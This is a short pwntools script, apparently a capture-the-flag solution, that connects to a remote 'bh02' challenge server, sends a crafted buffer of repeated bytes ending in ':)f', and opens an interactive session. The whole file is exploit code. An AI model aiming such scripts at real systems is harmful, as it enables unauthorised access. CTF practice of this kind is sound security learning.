from pwn import *

context.terminal = ['termite', '-e']


# p = process('./bh02')
# p = gdb.debug("./bh02")
p = remote('ggcs-bh02.allyourbases.co', 8133)


buf_length = 0x50

payload = b'f' * 0x32 + b':)f'

print(p.recvuntil(":"))

p.sendline(payload)

p.interactive()